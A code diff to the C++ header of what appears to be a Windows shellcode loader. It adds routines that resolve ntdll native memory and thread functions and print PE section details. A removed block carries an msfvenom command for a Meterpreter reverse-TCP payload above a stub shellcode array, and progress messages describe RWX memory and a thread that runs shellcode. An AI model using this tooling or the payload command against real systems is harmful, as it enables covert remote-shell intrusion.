@@ -1,6 +1,7 @@
 #pragma once
 #include <windows.h>
 #include <stdio.h>
+#include <string>
 #include <iostream> 
 
 typedef LONG NTSTATUS;
@@ -80,15 +81,6 @@ ULONG oldProtect;
 NTSTATUS status;
 HANDLE threadHandle;
 SIZE_T bytesWritten;
-
-unsigned char shellcode[] = {
-    // define your shellcode
-    // msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f csharp -b "\x00\x0a\x0d" EXITFUNC=thread 
-    // or create you personall shellcode    
-
-    0x90, 0x90, 0xC3 
-};
-
 
 #define Sq_AllocateMemory(processHandle, baseAddress, regionSize, allocationType, protect) \
     do { \
@@ -177,7 +169,6 @@ BOOL InitNtFunctions() {
 
     return TRUE;
 }
-
 bool EnableDebugPrivilege() {
     HANDLE hToken;
     LUID luid;
@@ -249,51 +240,218 @@ void Ntdl() {
 void NtVirt() {
     printf("      Loading function: NtAllocateVirtualMemory");
     effect();
+
+    HMODULE hModule = LoadLibrary(L"ntdll.dll");
+    if (hModule == NULL) {
+        printf("[!] Failed to load ntdll.dll\n");
+        return;
+    }
+
+    FARPROC procNtAllocateVirtualMemory = GetProcAddress(hModule, "NtAllocateVirtualMemory");
+    if (!procNtAllocateVirtualMemory) {
+        printf("[!] Failed to get function address: NtAllocateVirtualMemory\n");
+        FreeLibrary(hModule);
+        return;
+    }
+
     printf("[*] Loaded function: NtAllocateVirtualMemory\n");
+    printf("     [+] Address of function NtAllocateVirtualMemory: 0x%p\n", procNtAllocateVirtualMemory);
+
+    FreeLibrary(hModule);
 }
+
 void NtWrite() {
     printf("      Loading function: NtWriteVirtualMemory");
     effect();
+
+    HMODULE hModule = LoadLibrary(L"ntdll.dll");
+    if (hModule == NULL) {
+        printf("[!] Failed to load ntdll.dll\n");
+        return;
+    }
+
+    FARPROC procNtWriteVirtualMemory = GetProcAddress(hModule, "NtWriteVirtualMemory");
+    if (!procNtWriteVirtualMemory) {
+        printf("[!] Failed to get function address: NtWriteVirtualMemory\n");
+        FreeLibrary(hModule);
+        return;
+    }
+
     printf("[*] Loaded function: NtWriteVirtualMemory\n");
+    printf("    [+] Address of function NtWriteVirtualMemory: 0x%p\n", procNtWriteVirtualMemory);
+
+    FreeLibrary(hModule);
 }
+
 void NtProtect() {
     printf("      Loading function: NtProtectVirtualMemory");
     effect();
+
+    HMODULE hModule = LoadLibrary(L"ntdll.dll");
+    if (hModule == NULL) {
+        printf("[!] Failed to load ntdll.dll\n");
+        return;
+    }
+
+    FARPROC procNtProtectVirtualMemory = GetProcAddress(hModule, "NtProtectVirtualMemory");
+    if (!procNtProtectVirtualMemory) {
+        printf("[!] Failed to get function address: NtProtectVirtualMemory\n");
+        FreeLibrary(hModule);
+        return;
+    }
+
     printf("[*] Loaded function: NtProtectVirtualMemory\n");
+    printf("    [+] Address of function NtProtectVirtualMemory: 0x%p\n", procNtProtectVirtualMemory);
+
+    FreeLibrary(hModule);
 }
+
 void PageMemR() {
-    printf("      Set Memory protection to PAGE_EXECUTE_READWRITE ");
+    printf("      Setting memory protection to PAGE_EXECUTE_READWRITE ");
     effect();
     printf("[*] Memory protection set to PAGE_EXECUTE_READWRITE\n");
 }
+
 void NtThread() {
     printf("      Loading function: NtCreateThreadEx");
     effect();
+
+    HMODULE hModule = LoadLibrary(L"ntdll.dll");
+    if (hModule == NULL) {
+        printf("[!] Failed to load ntdll.dll\n");
+        return;
+    }
+
+    FARPROC procNtCreateThreadEx = GetProcAddress(hModule, "NtCreateThreadEx");
+    if (!procNtCreateThreadEx) {
+        printf("[!] Failed to get function address: NtCreateThreadEx\n");
+        FreeLibrary(hModule);
+        return;
+    }
+
     printf("[*] Loaded function: NtCreateThreadEx\n");
+    printf("    [+] Address of function NtCreateThreadEx: 0x%p\n", procNtCreateThreadEx);
+
+    FreeLibrary(hModule);
 }
 
 void ThdxSc() {
-    printf("      Creating Thread to execute shellcode");
+    printf("      Creating thread to execute shellcode");
     effect();
     printf("[+] Thread created to execute shellcode\n");
 }
+
 void NtObjcect() {
-    printf("      Loading function: NtWaitForSingleObject ");
+    printf("      Loading function: NtWaitForSingleObject");
     effect();
+
+    HMODULE hModule = LoadLibrary(L"ntdll.dll");
+    if (hModule == NULL) {
+        printf("[!] Failed to load ntdll.dll\n");
+        return;
+    }
+
+    FARPROC procNtWaitForSingleObject = GetProcAddress(hModule, "NtWaitForSingleObject");
+    if (!procNtWaitForSingleObject) {
+        printf("[!] Failed to get function address: NtWaitForSingleObject\n");
+        FreeLibrary(hModule);
+        return;
+    }
+
     printf("[*] Loaded function: NtWaitForSingleObject\n");
+    printf("    [+] Address of function NtWaitForSingleObject: 0x%p\n", procNtWaitForSingleObject);
+
+    FreeLibrary(hModule);
 }
+
 void NtFreeMemory() {
     printf("      Loading function: NtFreeVirtualMemory");
     effect();
+
+    HMODULE hModule = LoadLibrary(L"ntdll.dll");
+    if (hModule == NULL) {
+        printf("[!] Failed to load ntdll.dll\n");
+        return;
+    }
+
+    FARPROC procNtFreeVirtualMemory = GetProcAddress(hModule, "NtFreeVirtualMemory");
+    if (!procNtFreeVirtualMemory) {
+        printf("[!] Failed to get function address: NtFreeVirtualMemory\n");
+        FreeLibrary(hModule);
+        return;
+    }
+
     printf("[*] Loaded function: NtFreeVirtualMemory\n");
+    printf("    [+] Address of function NtFreeVirtualMemory: 0x%p\n", procNtFreeVirtualMemory);
+
+    FreeLibrary(hModule);
 }
+
 void FredMem() {
     printf("      Freeing your memory");
     effect();
-    printf("[+] Memory freed    \n");
+    printf("[+] Memory freed\n");
 }
+
 void Ntcose() {
     printf("      Loading function: NtClose");
     effect();
+
+    HMODULE hModule = LoadLibrary(L"ntdll.dll");
+    if (hModule == NULL) {
+        printf("[!] Failed to load ntdll.dll\n");
+        return;
+    }
+
+    FARPROC procNtClose = GetProcAddress(hModule, "NtClose");
+    if (!procNtClose) {
+        printf("[!] Failed to get function address: NtClose\n");
+        FreeLibrary(hModule);
+        return;
+    }
+
     printf("[*] Loaded function: NtClose\n");
+    printf("    [+] Address of function NtClose: 0x%p\n", procNtClose);
+
+    FreeLibrary(hModule);
+}
+
+void PrintSectionProtection(DWORD characteristics) {
+    if (characteristics & IMAGE_SCN_MEM_EXECUTE) {
+        std::cout << "Executable ";
+    }
+    if (characteristics & IMAGE_SCN_MEM_READ) {
+        std::cout << "Readable ";
+    }
+    if (characteristics & IMAGE_SCN_MEM_WRITE) {
+        std::cout << "Writable ";
+    }
+    if (characteristics & IMAGE_SCN_MEM_DISCARDABLE) {
+        std::cout << "Discardable ";
+    }
+    std::cout << std::endl;
+}
+
+void PrintDllInfo(HMODULE hModule) {
+    if (!hModule) {
+        std::cerr << "Invalid module handle." << std::endl;
+        return;
+    }
+    BYTE* baseAddress = reinterpret_cast<BYTE*>(hModule);
+    std::cout << "          [-] Base Address: 0x" << static_cast<void*>(baseAddress) << std::endl;
+
+    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(baseAddress);
+    IMAGE_NT_HEADERS* ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(baseAddress + dosHeader->e_lfanew);
+
+    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(ntHeaders);
+    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section) {
+        std::string sectionName(reinterpret_cast<char*>(section->Name), 8);
+        if (sectionName.find(".text") != std::string::npos || sectionName.find("PAGE") != std::string::npos) {
+            std::cout << "          [-] Section Name: " << sectionName << std::endl;
+            std::cout << "          [-] Virtual Address: 0x" << static_cast<void*>(baseAddress + section->VirtualAddress) << std::endl;
+            std::cout << "          [-] Size: " << section->Misc.VirtualSize << std::endl;
+            std::cout << "          [-] Protection: ";
+            PrintSectionProtection(section->Characteristics);
+        }
+    }
 }
